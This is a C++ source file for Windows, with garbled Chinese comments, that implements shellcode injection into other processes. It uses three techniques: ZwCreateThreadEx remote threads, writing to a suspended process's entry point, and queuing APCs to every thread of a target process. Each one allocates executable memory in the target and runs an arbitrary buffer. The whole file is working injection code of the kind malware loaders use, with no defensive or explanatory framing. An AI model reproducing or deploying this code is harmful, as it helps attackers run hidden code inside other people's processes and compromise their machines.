#include "CodeInject.h"
//#include "CodeInject.h"

BOOL CodeInject::ZwCreateThreadExCodeInject(DWORD dwPid, CodeBuffer Buffer)
{
	HANDLE hProcess = NULL;
	HANDLE hRemoteThread = NULL;
	PVOID pRemoteBuffer = NULL;
	BOOL bFlag = FALSE;

	//EnableDebugPriv(SE_DEBUG_NAME);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (hProcess == NULL)	//�˴�����INVALID_HANDLE_VALUE�����Ǹ���ʷ�����Ĵ�ӣ���ʱ�����жϾ����Ҫ����Ӧ�����ķ���ֵ
	{
		return FALSE;
	}

	pRemoteBuffer = VirtualAllocEx(hProcess, NULL, Buffer.BufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pRemoteBuffer)
	{
		CloseHandle(hProcess);
		return FALSE;
	}

	bFlag = WriteProcessMemory(hProcess, pRemoteBuffer, Buffer.pBuffer, Buffer.BufferSize, NULL);
	if (!bFlag)
	{
		CloseHandle(hProcess);
		return FALSE;
	}

	HMODULE hNtdll = NULL;
	hNtdll = GetModuleHandleA("ntdll.dll");
	//hNtdll = LoadLibraryA("ntdll.dll");
	if (!hNtdll)
	{
		CloseHandle(hProcess);
		return FALSE;
	}

#ifdef _WIN64
	typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
		PHANDLE ThreadHandle,
		ACCESS_MASK DesiredAccess,
		LPVOID ObjectAttributes,
		HANDLE ProcessHandle,
		LPTHREAD_START_ROUTINE lpStartAddress,
		LPVOID lpParameter,
		ULONG CreateThreadFlags,
		SIZE_T ZeroBits,
		SIZE_T StackSize,
		SIZE_T MaximumStackSize,
		LPVOID pUnkown);
#else
	typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
		PHANDLE ThreadHandle,   //�߳̾��
		ACCESS_MASK DesiredAccess,
		LPVOID ObjectAttributes,
		HANDLE ProcessHandle,	//���̾��
		LPTHREAD_START_ROUTINE lpStartAddress,
		LPVOID lpParameter,
		BOOL CreateSuspended,
		DWORD dwStackSize,
		DWORD dw1,
		DWORD dw2,
		LPVOID pUnkown);
#endif

	typedef_ZwCreateThreadEx ZwCreateThreadEx = NULL;
	ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdll, "ZwCreateThreadEx");
	if (ZwCreateThreadEx == NULL)
	{
		CloseHandle(hProcess);
		return FALSE;
	}

	NTSTATUS ntStatus = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, FALSE, 0, 0, 0, NULL);
	if (ntStatus < 0)
	{
		CloseHandle(hProcess);
		return FALSE;
	}

	WaitForSingleObject(hRemoteThread, 1000);

	CloseHandle(hRemoteThread);
	CloseHandle(hProcess);

	return TRUE;
}

BOOL CodeInject::CreateProcessCodeInject(const PCHAR pszTarget,CodeBuffer Buffer)
{
	STARTUPINFO start = { 0 };
	PROCESS_INFORMATION ProcessInfo = { 0 };
	start.cb = sizeof(STARTUPINFO);

	memset(&ProcessInfo, 0, sizeof(PROCESS_INFORMATION));

	if (!CreateProcess(
		pszTarget,
		NULL,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		&start,
		&ProcessInfo
	))
	{
		printf("CreateProcess Fail:%x\n", GetLastError());
		return 0;
	}

	//��ȡ�߳������� �õ�������ڵ��ַ
	CONTEXT context;
	context.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(ProcessInfo.hThread, &context))
	{
		printf("Get ThreadContext Fail:%x\n", GetLastError());
		TerminateProcess(ProcessInfo.hProcess, 0);
		return 0;
	}

	BOOL bFlag = FALSE;
#ifdef _WIN64
	bFlag = WriteProcessMemory(ProcessInfo.hProcess, (LPVOID)context.Rax, Buffer.pBuffer, Buffer.BufferSize, 0);
#else
	bFlag = WriteProcessMemory(ProcessInfo.hProcess, (LPVOID)context.Eax, Buffer.pBuffer, Buffer.BufferSize, 0);
#endif
	//д��shellcode
	if (!bFlag)
	{
		printf("Write Shellcode faild (%d). \n", GetLastError());
		TerminateProcess(ProcessInfo.hProcess, 0);
		return 0;
	}

	//�ָ��߳�����
	if (ResumeThread(ProcessInfo.hThread) == (DWORD)-1)
	{
		printf("ResumeThread Fail:%x\n", GetLastError());
		TerminateProcess(ProcessInfo.hProcess, 0);
		return 0;
	}
	return TRUE;
}


BOOL GetAllThreadIdByProcessId(DWORD dwProcessId, DWORD** ppThreadId, DWORD* pdwThreadIdLength)
{
	DWORD* pThreadId = NULL;
	DWORD dwThreadIdLength = 0;
	DWORD dwBufferLength = 1000;
	THREADENTRY32 te32 = { 0 };
	HANDLE hSnapshot = NULL;
	BOOL bRet = TRUE;

	do
	{
		// �����ڴ�
		pThreadId = new DWORD[dwBufferLength];
		if (NULL == pThreadId)
		{
			printf("new");
			bRet = FALSE;
			break;
		}
		::RtlZeroMemory(pThreadId, (dwBufferLength * sizeof(DWORD)));

		// ��ȡ�߳̿���
		::RtlZeroMemory(&te32, sizeof(te32));
		te32.dwSize = sizeof(te32);
		hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		if (NULL == hSnapshot)
		{
			printf("CreateToolhelp32Snapshot");
			bRet = FALSE;
			break;
		}

		// ��ȡ��һ���߳̿�����Ϣ
		bRet = ::Thread32First(hSnapshot, &te32);
		while (bRet)
		{
			// ��ȡ���̶�Ӧ���߳�ID
			if (te32.th32OwnerProcessID == dwProcessId)
			{
				pThreadId[dwThreadIdLength] = te32.th32ThreadID;
				dwThreadIdLength++;
			}

			// ������һ���߳̿�����Ϣ
			bRet = ::Thread32Next(hSnapshot, &te32);
		}

		// ����
		*ppThreadId = pThreadId;
		*pdwThreadIdLength = dwThreadIdLength;
		bRet = TRUE;

	} while (FALSE);

	if (FALSE == bRet)
	{
		if (pThreadId)
		{
			delete[]pThreadId;
			pThreadId = NULL;
		}
	}
	return bRet;
}

BOOL CodeInject::QueueUserAPCCodeInject(DWORD dwPid, CodeBuffer Buffer)
{
	BOOL bRet = FALSE;
	DWORD* pThreadId = NULL;
	DWORD dwThreadIdLength = 0;
	HANDLE hProcess = NULL, hThread = NULL;
	PVOID pRemoteBuffer = NULL;
	SIZE_T dwRet = 0;
	DWORD i = 0;

	bRet = GetAllThreadIdByProcessId(dwPid, &pThreadId, &dwThreadIdLength);
	if (FALSE == bRet)
	{
		return FALSE;
	}
	hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (NULL == hProcess)
	{
		printf("OpenProcess");
		return FALSE;
	}

	// ��ע����̿ռ������ڴ�
	pRemoteBuffer = ::VirtualAllocEx(hProcess, NULL, Buffer.BufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pRemoteBuffer == NULL)
	{
		printf("VirtualAllocEx");
		return FALSE;
	}
	// ������Ŀռ���д��Shellcode
	WriteProcessMemory(hProcess, pRemoteBuffer, Buffer.pBuffer, Buffer.BufferSize, &dwRet);
	if (dwRet != Buffer.BufferSize)
	{
		printf("WriteProcessMemory");
		return FALSE;
	}

	// �����߳�, ����APC
	for (i = 0; i < dwThreadIdLength; i++)
	{
		// ���߳�
		hThread = ::OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadId[i]);
		if (hThread)
		{
			// ����APC
			::QueueUserAPC((PAPCFUNC)pRemoteBuffer, hThread, (ULONG_PTR)pRemoteBuffer);
			// �ر��߳̾��
			::CloseHandle(hThread);
			hThread = NULL;
		}
	}

	if (hProcess)
	{
		::CloseHandle(hProcess);
		hProcess = NULL;
	}
	if (pThreadId)
	{
		delete[]pThreadId;
		pThreadId = NULL;
	}

	return TRUE;
}

